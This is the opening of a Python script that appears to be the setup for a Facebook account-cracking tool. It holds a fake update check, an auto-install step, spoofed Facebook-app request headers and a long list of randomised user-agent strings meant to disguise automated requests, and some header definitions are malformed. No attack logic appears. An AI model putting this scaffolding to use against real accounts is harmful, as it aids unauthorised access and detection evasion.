import uuid
import string
from os import path
from urllib.request import urlopen
import os
import time
import re
import random
import sys
import subprocess
from string import *
from concurrent.futures import ThreadPoolExecutor as tred

def clear():
    os.system('clear')

print('sus')
print('\033[1;37m[+] \033[1;32m[+]CHECKING UPDATES...')
time.sleep(5)

try:
    import requests
except ModuleNotFoundError:
    print('\n Installing missing modules ...')
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python Dark.py')

except:pass
header_grup = {'user-agent':'FBAN/FB4A;FBAV/328.1.0.28.119;FBPN/com.facebook.katana;FBLC/en_US;FBBV/306506931;FBCR/Bouygues Telecom;FBMF/samsung;FBBD/samsung;FBDV/SM-G930F;FBSV/7.1.1;FBCA/x86:armeabi;FBDM/{density=3.0,width=1080,height=1794'}
head = {'User Agent : "Mozilla/5.0 (compatible; MSIE 11.0; Windows; U; Windows NT 10.5; x64 Trident/7.0) [FBAN/AndroidSampleApp;FBAV/348.719.618.179;FBLC/en_US;FBBV/709835163;FBCR/Zong;FBMF/Infinix;FBBD/Infinix;FBDV/Infinix X682B;FBSV/12.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.3312501,width=800,height=1216};FB_FW/1'}
head = {"user-agent": "Mozilla/5.0 (Linux i544 x86_64) AppleWebKit/601.29 (KHTML, like Gecko) Chrome/52.0.2516.193 Safari/535 [FBAN/MessengerLite;FBAV/317.0.0.3.45;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/796703265;FBCR/Telenor;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO LC8;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.25,height=,width=};]"}
header_grup = {"Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_3; like Mac OS X) AppleWebKit/602.7 (KHTML, like Gecko)  Chrome/53.0.3798.381 Mobile Safari/602.5 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
header_grup = {"user-agent": "Mozilla/5.0 (Windows NT 6.1;; en-US) AppleWebKit/536.14 (KHTML, like Gecko) Chrome/55.0.1034.185 Safari/600 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
api = {"user-agent": "Mozilla/5.0 (Linux x86_64) AppleWebKit/536.42 (KHTML, like Gecko) Chrome/54.0.2633.139 Safari/602","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en-PK;q=0.6,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}
user_agent=['Mozilla/5.0 (Linux; U; Android 5.0; SM-A700 Build/LMY47X) AppleWebKit/535.20 (KHTML, like Gecko)  Chrome/48.0.2131.254 Mobile Safari/534.2','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/600.24 (KHTML, like Gecko)  Chrome/52.0.2157.162 Mobile Safari/603.4','Mozilla/5.0 (iPhone; CPU iPhone OS 11_9_1; like Mac OS X) AppleWebKit/603.9 (KHTML, like Gecko)  Chrome/49.0.1540.279 Mobile Safari/601.2','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_7_5; en-US) Gecko/20100101 Firefox/57.2','Mozilla/5.0 (Windows NT 10.3; WOW64; en-US) AppleWebKit/534.33 (KHTML, like Gecko) Chrome/54.0.2676.280 Safari/600.4 Edge/13.12955','Mozilla/5.0 (Linux; U; Linux x86_64) Gecko/20100101 Firefox/63.4','Mozilla/5.0 (Windows; U; Windows NT 10.2; Win64; x64; en-US) AppleWebKit/601.31 (KHTML, like Gecko) Chrome/51.0.3835.218 Safari/534.6 Edge/10.74556','Mozilla/5.0 (Macintosh; U; Intel Mac OS X 9_2_1) Gecko/20100101 Firefox/55.2','Mozilla/5.0 (Linux; U; Android 5.0; Nokia 1000 LTE Build/GRK39F) AppleWebKit/537.24 (KHTML, like Gecko)  Chrome/54.0.2769.101 Mobile Safari/533.4','Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_6; like Mac OS X) AppleWebKit/603.42 (KHTML, like Gecko)  Chrome/54.0.3383.256 Mobile Safari/536.2','Mozilla/5.0 (compatible; MSIE 8.0; Windows; Windows NT 6.1; WOW64; en-US Trident/4.0)','Mozilla/5.0 (iPhone; CPU iPhone OS 7_9_9; like Mac OS X) AppleWebKit/603.34 (KHTML, like Gecko)  Chrome/48.0.2595.374 Mobile Safari/601.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_2; like Mac OS X) AppleWebKit/533.31 (KHTML, like Gecko)  Chrome/48.0.1896.193 Mobile Safari/535.8','Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_9; like Mac OS X) AppleWebKit/600.17 (KHTML, like Gecko)  Chrome/47.0.2564.369 Mobile Safari/601.2','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_8; like Mac OS X) AppleWebKit/535.49 (KHTML, like Gecko)  Chrome/52.0.3051.372 Mobile Safari/534.7','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_0; like Mac OS X) AppleWebKit/603.32 (KHTML, like Gecko)  Chrome/54.0.2022.262 Mobile Safari/602.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_4_7; like Mac OS X) AppleWebKit/602.12 (KHTML, like Gecko)  Chrome/51.0.3486.168 Mobile Safari/536.3','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_5; like Mac OS X) AppleWebKit/537.6 (KHTML, like Gecko)  Chrome/52.0.3823.319 Mobile Safari/537.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_5_3; like Mac OS X) AppleWebKit/600.17 (KHTML, like Gecko)  Chrome/53.0.3290.143 Mobile Safari/601.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_4; like Mac OS X) AppleWebKit/603.34 (KHTML, like Gecko)  Chrome/54.0.3331.148 Mobile Safari/536.3','Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_3; like Mac OS X) AppleWebKit/536.12 (KHTML, like Gecko)  Chrome/53.0.2841.384 Mobile Safari/600.1','Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_7; like Mac OS X) AppleWebKit/603.41 (KHTML, like Gecko)  Chrome/50.0.1026.136 Mobile Safari/601.4','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_4; like Mac OS X) AppleWebKit/600.40 (KHTML, like Gecko)  Chrome/47.0.2600.106 Mobile Safari/601.4','Mozilla/5.0 (iPhone; CPU iPhone OS 10_5_8; like Mac OS X) AppleWebKit/536.4 (KHTML, like Gecko)  Chrome/51.0.3464.223 Mobile Safari/537.0','Mozilla/5.0 (iPhone; CPU iPhone OS 10_9_8; like Mac OS X) AppleWebKit/537.30 (KHTML, like Gecko)  Chrome/51.0.1691.309 Mobile Safari/601.7','Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_1; like Mac OS X) AppleWebKit/536.20 (KHTML, like Gecko)  Chrome/54.0.1758.305 Mobile Safari/536.2','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_6; like Mac OS X) AppleWebKit/602.38 (KHTML, like Gecko)  Chrome/53.0.1693.111 Mobile Safari/534.5','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_5; like Mac OS X) AppleWebKit/600.18 (KHTML, like Gecko)  Chrome/53.0.1260.398 Mobile Safari/536.7','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_1; like Mac OS X) AppleWebKit/602.12 (KHTML, like Gecko)  Chrome/53.0.1616.208 Mobile Safari/602.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_3_0; like Mac OS X) AppleWebKit/600.21 (KHTML, like Gecko)  Chrome/53.0.1592.301 Mobile Safari/537.1','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1; like Mac OS X) AppleWebKit/536.38 (KHTML, like Gecko)  Chrome/55.0.1307.270 Mobile Safari/534.6','Mozilla/5.0 (iPhone; CPU iPhone OS 7_5_6; like Mac OS X) AppleWebKit/600.14 (KHTML, like Gecko)  Chrome/50.0.1426.259 Mobile Safari/601.5','Mozilla/5.0 (iPhone; CPU iPhone OS 11_8_3; like Mac OS X) AppleWebKit/602.38 (KHTML, like Gecko)  Chrome/47.0.2931.342 Mobile Safari/535.2','Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_8; like Mac OS X) AppleWebKit/536.38 (KHTML, like Gecko)  Chrome/53.0.1069.323 Mobile Safari/534.5','Mozilla/5.0 (iPhone; CPU iPhone OS 11_6_2; like Mac OS X) AppleWebKit/537.16 (KHTML, like Gecko)  Chrome/55.0.3664.285 Mobile Safari/601.3','Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_9; like Mac OS X) AppleWebKit/536.28 (KHTML, like Gecko)  Chrome/54.0.2135.265 Mobile Safari/533.1','Mozilla/5.0 (iPhone; CPU iPhone OS 8_3_9; like Mac OS X) AppleWebKit/535.35 (KHTML, like Gecko)  Chrome/50.0.3962.159 Mobile Safari/600.0','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_8; like Mac OS X) AppleWebKit/601.43 (KHTML, like Gecko)  Chrome/47.0.3478.258 Mobile Safari/535.1','Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_9; like Mac OS X) AppleWebKit/535.44 (KHTML, like Gecko)  Chrome/55.0.1878.262 Mobile Safari/603.1','Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_1; like Mac OS X) AppleWebKit/601.39 (KHTML, like Gecko)  Chrome/51.0.1314.323 Mobile Safari/602.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3; like Mac OS X) AppleWebKit/602.47 (KHTML, like Gecko)  Chrome/51.0.1561.256 Mobile Safari/536.0','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/536.16 (KHTML, like Gecko)  Chrome/50.0.1095.344 Mobile Safari/600.4','Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_4; like Mac OS X) AppleWebKit/537.41 (KHTML, like Gecko)  Chrome/49.0.1750.147 Mobile Safari/535.9','Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_3; like Mac OS X) AppleWebKit/603.37 (KHTML, like Gecko)  Chrome/48.0.3580.114 Mobile Safari/537.1','Mozilla/5.0 (iPhone; CPU iPhone OS 7_5_5; like Mac OS X) AppleWebKit/600.44 (KHTML, like Gecko)  Chrome/50.0.1970.387 Mobile Safari/537.0','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_8; like Mac OS X) AppleWebKit/602.16 (KHTML, like Gecko)  Chrome/54.0.3605.205 Mobile Safari/602.8','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_7; like Mac OS X) AppleWebKit/536.16 (KHTML, like Gecko)  Chrome/49.0.3625.197 Mobile Safari/536.8','Mozilla/5.0 (iPhone; CPU iPhone OS 9_9_4; like Mac OS X) AppleWebKit/533.34 (KHTML, like Gecko)  Chrome/48.0.2379.149 Mobile Safari/533.9','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_6; like Mac OS X) AppleWebKit/537.40 (KHTML, like Gecko)  Chrome/52.0.3336.177 Mobile Safari/537.5','Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_7; like Mac OS X) AppleWebKit/534.5 (KHTML, like Gecko)  Chrome/50.0.3300.211 Mobile Safari/535.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1; like Mac OS X) AppleWebKit/600.36 (KHTML, like Gecko)  Chrome/48.0.3635.280 Mobile Safari/602.0','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_7; like Mac OS X) AppleWebKit/536.16 (KHTML, like Gecko)  Chrome/50.0.1095.344 Mobile Safari/600.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_4_6; like Mac OS X) AppleWebKit/536.6 (KHTML, like Gecko)  Chrome/53.0.3492.134 Mobile Safari/600.8','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_7; like Mac OS X) AppleWebKit/537.20 (KHTML, like Gecko)  Chrome/51.0.1532.191 Mobile Safari/535.9','Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_0; like Mac OS X) AppleWebKit/534.41 (KHTML, like Gecko)  Chrome/49.0.1695.248 Mobile Safari/536.8','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_4; like Mac OS X) AppleWebKit/536.22 (KHTML, like Gecko)  Chrome/55.0.3807.255 Mobile Safari/602.0','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_6; like Mac OS X) AppleWebKit/603.22 (KHTML, like Gecko)  Chrome/55.0.2609.229 Mobile Safari/603.8','Mozilla/5.0 (iPhone; CPU iPhone OS 8_2_1; like Mac OS X) AppleWebKit/601.13 (KHTML, like Gecko)  Chrome/50.0.2372.194 Mobile Safari/533.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_1; like Mac OS X) AppleWebKit/534.29 (KHTML, like Gecko)  Chrome/47.0.2227.397 Mobile Safari/601.3','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_8; like Mac OS X) AppleWebKit/602.45 (KHTML, like Gecko)  Chrome/54.0.3015.328 Mobile Safari/601.3','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1; like Mac OS X) AppleWebKit/600.47 (KHTML, like Gecko)  Chrome/50.0.2450.300 Mobile Safari/535.4','Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_1; like Mac OS X) AppleWebKit/536.19 (KHTML, like Gecko)  Chrome/53.0.3231.397 Mobile Safari/603.7','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_4; like Mac OS X) AppleWebKit/536.40 (KHTML, like Gecko)  Chrome/49.0.2729.140 Mobile Safari/601.5','Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_3; like Mac OS X) AppleWebKit/536.6 (KHTML, like Gecko)  Chrome/55.0.1394.297 Mobile Safari/536.9','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_9; like Mac OS X) AppleWebKit/537.39 (KHTML, like Gecko)  Chrome/47.0.3941.280 Mobile Safari/601.5','Mozilla/5.0 (iPhone; CPU iPhone OS 9_7_2; like Mac OS X) AppleWebKit/603.16 (KHTML, like Gecko)  Chrome/54.0.2280.146 Mobile Safari/601.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_8; like Mac OS X) AppleWebKit/602.10 (KHTML, like Gecko)  Chrome/52.0.2445.164 Mobile Safari/537.6','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_2; like Mac OS X) AppleWebKit/600.33 (KHTML, like Gecko)  Chrome/50.0.2318.195 Mobile Safari/601.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_3_4; like Mac OS X) AppleWebKit/601.35 (KHTML, like Gecko)  Chrome/48.0.1702.155 Mobile Safari/603.9','Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_6; like Mac OS X) AppleWebKit/600.30 (KHTML, like Gecko)  Chrome/55.0.2581.256 Mobile Safari/601.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_2; like Mac OS X) AppleWebKit/534.27 (KHTML, like Gecko)  Chrome/48.0.3039.112 Mobile Safari/534.8','Mozilla/5.0 (iPhone; CPU iPhone OS 10_4_2; like Mac OS X) AppleWebKit/534.27 (KHTML, like Gecko)  Chrome/48.0.3039.112 Mobile Safari/534.8','Mozilla/5.0 (iPhone; CPU iPhone OS 8_2_1; like Mac OS X) AppleWebKit/600.37 (KHTML, like Gecko)  Chrome/52.0.1301.103 Mobile Safari/535.5','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_5; like Mac OS X) AppleWebKit/603.9 (KHTML, like Gecko)  Chrome/50.0.1435.304 Mobile Safari/600.8','Mozilla/5.0 (iPhone; CPU iPhone OS 8_5_8; like Mac OS X) AppleWebKit/601.42 (KHTML, like Gecko)  Chrome/50.0.2431.241 Mobile Safari/533.9','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_1; like Mac OS X) AppleWebKit/535.48 (KHTML, like Gecko)  Chrome/55.0.2242.344 Mobile Safari/603.2','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_8; like Mac OS X) AppleWebKit/602.19 (KHTML, like Gecko)  Chrome/54.0.2837.365 Mobile Safari/533.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_6_3; like Mac OS X) AppleWebKit/533.45 (KHTML, like Gecko)  Chrome/49.0.1275.232 Mobile Safari/536.9','Mozilla/5.0 (iPhone; CPU iPhone OS 10_9_7; like Mac OS X) AppleWebKit/601.47 (KHTML, like Gecko)  Chrome/51.0.3804.236 Mobile Safari/537.4','Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_9; like Mac OS X) AppleWebKit/600.41 (KHTML, like Gecko)  Chrome/50.0.3433.177 Mobile Safari/603.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_6; like Mac OS X) AppleWebKit/601.19 (KHTML, like Gecko)  Chrome/52.0.1580.163 Mobile Safari/534.9','Mozilla/5.0 (iPhone; CPU iPhone OS 10_0_6; like Mac OS X) AppleWebKit/601.19 (KHTML, like Gecko)  Chrome/52.0.1580.163 Mobile Safari/534.9','Mozilla/5.0 (iPhone; CPU iPhone OS 7_4_5; like Mac OS X) AppleWebKit/536.5 (KHTML, like Gecko)  Chrome/53.0.2198.200 Mobile Safari/537.8','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_7; like Mac OS X) AppleWebKit/535.14 (KHTML, like Gecko)  Chrome/55.0.3264.389 Mobile Safari/533.8','Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_2; like Mac OS X) AppleWebKit/601.24 (KHTML, like Gecko)  Chrome/54.0.3639.378 Mobile Safari/603.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_1_1; like Mac OS X) AppleWebKit/601.12 (KHTML, like Gecko)  Chrome/55.0.2904.346 Mobile Safari/600.8','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_5; like Mac OS X) AppleWebKit/603.39 (KHTML, like Gecko)  Chrome/48.0.3222.238 Mobile Safari/536.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_8; like Mac OS X) AppleWebKit/600.27 (KHTML, like Gecko)  Chrome/49.0.3088.268 Mobile Safari/600.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_9; like Mac OS X) AppleWebKit/533.40 (KHTML, like Gecko)  Chrome/47.0.3123.309 Mobile Safari/535.8','Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2; like Mac OS X) AppleWebKit/602.49 (KHTML, like Gecko)  Chrome/47.0.1252.373 Mobile Safari/535.3','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_0; like Mac OS X) AppleWebKit/533.5 (KHTML, like Gecko)  Chrome/47.0.2844.130 Mobile Safari/602.9','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_0; like Mac OS X) AppleWebKit/533.5 (KHTML, like Gecko)  Chrome/47.0.2844.130 Mobile Safari/602.9','Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_6; like Mac OS X) AppleWebKit/534.37 (KHTML, like Gecko)  Chrome/55.0.2462.400 Mobile Safari/536.0','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_2; like Mac OS X) AppleWebKit/534.40 (KHTML, like Gecko)  Chrome/53.0.1019.134 Mobile Safari/537.1','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_3; like Mac OS X) AppleWebKit/601.2 (KHTML, like Gecko)  Chrome/50.0.2090.158 Mobile Safari/603.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_0; like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko)  Chrome/50.0.2479.240 Mobile Safari/601.6','Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_0; like Mac OS X) AppleWebKit/537.7 (KHTML, like Gecko)  Chrome/55.0.1949.357 Mobile Safari/603.8','Mozilla/5.0 (iPhone; CPU iPhone OS 8_8_3; like Mac OS X) AppleWebKit/534.10 (KHTML, like Gecko)  Chrome/52.0.2524.233 Mobile Safari/600.5','Mozilla/5.0 (iPhone; CPU iPhone OS 7_4_5; like Mac OS X) AppleWebKit/601.3 (KHTML, like Gecko)  Chrome/49.0.2600.316 Mobile Safari/600.0','Mozilla/5.0 (iPhone; CPU iPhone OS 9_7_2; like Mac OS X) AppleWebKit/537.1 (KHTML, like Gecko)  Chrome/49.0.2302.144 Mobile Safari/535.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_8; like Mac OS X) AppleWebKit/602.35 (KHTML, like Gecko)  Chrome/54.0.3216.149 Mobile Safari/535.9','Mozilla/5.0 (iPhone; CPU iPhone OS 8_6_2; like Mac OS X) AppleWebKit/533.43 (KHTML, like Gecko)  Chrome/53.0.3309.163 Mobile Safari/600.7','Mozilla/5.0 (iPhone; CPU iPhone OS 7_9_2; like Mac OS X) AppleWebKit/537.49 (KHTML, like Gecko)  Chrome/48.0.1009.234 Mobile Safari/603.7','Mozilla/5.0 (iPhone; CPU iPhone OS 9_9_7; like Mac OS X) AppleWebKit/600.45 (KHTML, like Gecko)  Chrome/47.0.1938.105 Mobile Safari/533.5','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_8; like Mac OS X) AppleWebKit/534.42 (KHTML, like Gecko)  Chrome/51.0.2341.106 Mobile Safari/602.9','Mozilla/5.0 (iPhone; CPU iPhone OS 9_6_0; like Mac OS X) AppleWebKit/537.21 (KHTML, like Gecko)  Chrome/54.0.3121.170 Mobile Safari/601.2','Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_2; like Mac OS X) AppleWebKit/600.25 (KHTML, like Gecko)  Chrome/50.0.3620.261 Mobile Safari/533.9','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_1; like Mac OS X) AppleWebKit/602.29 (KHTML, like Gecko)  Chrome/50.0.1072.313 Mobile Safari/537.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_9; like Mac OS X) AppleWebKit/537.45 (KHTML, like Gecko)  Chrome/53.0.1304.106 Mobile Safari/534.6','Mozilla/5.0 (iPhone; CPU iPhone OS 11_3_2; like Mac OS X) AppleWebKit/601.32 (KHTML, like Gecko)  Chrome/50.0.2873.102 Mobile Safari/533.3','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_4; like Mac OS X) AppleWebKit/600.29 (KHTML, like Gecko)  Chrome/53.0.3831.391 Mobile Safari/537.0','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_4; like Mac OS X) AppleWebKit/600.29 (KHTML, like Gecko)  Chrome/53.0.3831.391 Mobile Safari/537.0','Mozilla/5.0 (iPhone; CPU iPhone OS 11_0_5; like Mac OS X) AppleWebKit/534.22 (KHTML, like Gecko)  Chrome/53.0.2253.110 Mobile Safari/537.3','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_6; like Mac OS X) AppleWebKit/536.14 (KHTML, like Gecko)  Chrome/53.0.2118.224 Mobile Safari/600.1','Mozilla/5.0 (iPhone; CPU iPhone OS 7_7_5; like Mac OS X) AppleWebKit/537.37 (KHTML, like Gecko)  Chrome/53.0.3802.180 Mobile Safari/601.8','Mozilla/5.0 (iPhone; CPU iPhone OS 7_2_0; like Mac OS X) AppleWebKit/601.9 (KHTML, like Gecko)  Chrome/54.0.3038.255 Mobile Safari/535.2','Mozilla/5.0 (iPhone; CPU iPhone OS 7_4_5; like Mac OS X) AppleWebKit/601.37 (KHTML, like Gecko)  Chrome/52.0.1713.188 Mobile Safari/600.0','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_3; like Mac OS X) AppleWebKit/535.28 (KHTML, like Gecko)  Chrome/50.0.1116.343 Mobile Safari/601.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_7_4; like Mac OS X) AppleWebKit/601.28 (KHTML, like Gecko)  Chrome/55.0.3022.336 Mobile Safari/535.0','Mozilla/5.0 (iPhone; CPU iPhone OS 9_8_5; like Mac OS X) AppleWebKit/601.17 (KHTML, like Gecko)  Chrome/49.0.1522.182 Mobile Safari/603.2','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_1; like Mac OS X) AppleWebKit/601.20 (KHTML, like Gecko)  Chrome/55.0.2103.214 Mobile Safari/603.6','Mozilla/5.0 (iPhone; CPU iPhone OS 9_0_1; like Mac OS X) AppleWebKit/601.20 (KHTML, like Gecko)  Chrome/55.0.2103.214 Mobile Safari/603.6','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_0; like Mac OS X) AppleWebKit/602.31 (KHTML, like Gecko)  Chrome/47.0.1734.170 Mobile Safari/534.1','Mozilla/5.0 (iPhone; CPU iPhone OS 11_1_6; like Mac OS X) AppleWebKit/535.46 (KHTML, like Gecko)  Chrome/50.0.1903.121 Mobile Safari/600.6','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_0; like Mac OS X) AppleWebKit/600.26 (KHTML, like Gecko)  Chrome/47.0.1558.324 Mobile Safari/600.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_5_7; like Mac OS X) AppleWebKit/533.12 (KHTML, like Gecko)  Chrome/47.0.1116.222 Mobile Safari/537.0','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_9; like Mac OS X) AppleWebKit/533.3 (KHTML, like Gecko)  Chrome/53.0.3240.100 Mobile Safari/533.2','Mozilla/5.0 (iPhone; CPU iPhone OS 7_3_4; like Mac OS X) AppleWebKit/536.16 (KHTML, like Gecko)  Chrome/49.0.3178.160 Mobile Safari/535.4','Mozilla/5.0 (iPhone; CPU iPhone OS 9_9_5; like Mac OS X) AppleWebKit/534.28 (KHTML, like Gecko)  Chrome/55.0.1878.279 Mobile Safari/600.9','Mozilla/5.0 (iPhone; CPU iPhone OS 11_3_9; like Mac OS X) AppleWebKit/603.6 (KHTML, like Gecko)  Chrome/50.0.1322.327 Mobile Safari/536.6','Mozilla/5.0 (iPhone; CPU iPhone OS 9_1_4; like Mac OS X) AppleWebKit/601.8 (KHTML, like Gecko)  Chrome/54.0.2435.149 Mobile Safari/533.8','Mozilla/5.0 (iPhone; CPU iPhone OS 11_4_8; like Mac OS X) AppleWebKit/535.8 (KHTML, like Gecko)  Chrome/50.0.1421.274 Mobile Safari/535.7','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_7; like Mac OS X) AppleWebKit/601.32 (KHTML, like Gecko)  Chrome/55.0.3793.353 Mobile Safari/537.7','Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_0; like Mac OS X) AppleWebKit/537.15 (KHTML, like Gecko)  Chrome/53.0.1537.213 Mobile Safari/536.8','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_7; like Mac OS X) AppleWebKit/533.33 (KHTML, like Gecko)  Chrome/53.0.3661.119 Mobile Safari/533.3','Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_2; like Mac OS X) AppleWebKit/534.40 (KHTML, like Gecko)  Chrome/47.0.1483.167 Mobile Safari/537.8','Mozilla/5.0 (iPhone; CPU iPhone OS 7_9_7; like Mac OS X) AppleWebKit/603.41 (KHTML, like Gecko)  Chrome/53.0.2786.146 Mobile Safari/534.4','Mozilla/5.0 (iPhone; CPU iPhone OS 8_9_8; like Mac OS X) AppleWebKit/533.6 (KHTML, like Gecko)  Chrome/51.0.1540.391 Mobile Safari/534.9','Mozilla/5.0 (iPhone; CPU iPhone OS 7_6_1; like Mac OS X) AppleWebKit/536.25 (KHTML, like Gecko)  Chrome/48.0.2599.311 Mobile Safari/533.9','Mozilla/5.0 (iPhone; CPU iPhone OS 11_7_3; like Mac OS X) AppleWebKit/537.8 (KHTML, like Gecko)  Chrome/50.0.3072.161 Mobile Safari/600.8','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_5; like Mac OS X) AppleWebKit/534.7 (KHTML, like Gecko)  Chrome/51.0.1785.277 Mobile Safari/534.9','Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_5; like Mac OS X) AppleWebKit/534.7 (KHTML, like Gecko)  Chrome/51.0.1785.277 Mobile Safari/534.9']
uas_bawaan = "Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_7; like Mac OS X) AppleWebKit/600.33 (KHTML, like Gecko)  Chrome/53.0.3216.194 Mobile Safari/537.6 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
uas_nokiac2 = "Mozilla/5.0 (Linux x86_64; en-US) AppleWebKit/536.44 (KHTML, like Gecko) Chrome/49.0.2161.363 Safari/533"
uas_nokiax20 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; Win64; x64) AppleWebKit/533.20 (KHTML, like Gecko) Chrome/52.0.1669.396 Safari/603.2 Edge/9.17825"
uas_nokiax = "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0_2; like Mac OS X) AppleWebKit/534.36 (KHTML, like Gecko)  Chrome/48.0.2243.347 Mobile Safari/601.5"
uas_samsungse = "Mozilla/5.0 (Linux; Linux x86_64) Gecko/20100101 Firefox/56.5"
uas_redmi9a = "Mozilla/5.0 (Windows; U; Windows NT 10.1; WOW64) AppleWebKit/600.31 (KHTML, like Gecko) Chrome/52.0.3965.182 Safari/535.4 Edge/18.29844"
uas_nokiaxl = "Mozilla/5.0 (Windows; U; Windows NT 10.2; Win64; x64) AppleWebKit/601.43 (KHTML, like Gecko) Chrome/47.0.1172.253 Safari/537.1 Edge/17.55757"
uas_chromelinux = "Mozilla/5.0 (Linux; Android 5.0; SM-N910FY Build/LRX22C) AppleWebKit/600.41 (KHTML, like Gecko)  Chrome/48.0.2407.306 Mobile Safari/603.7"
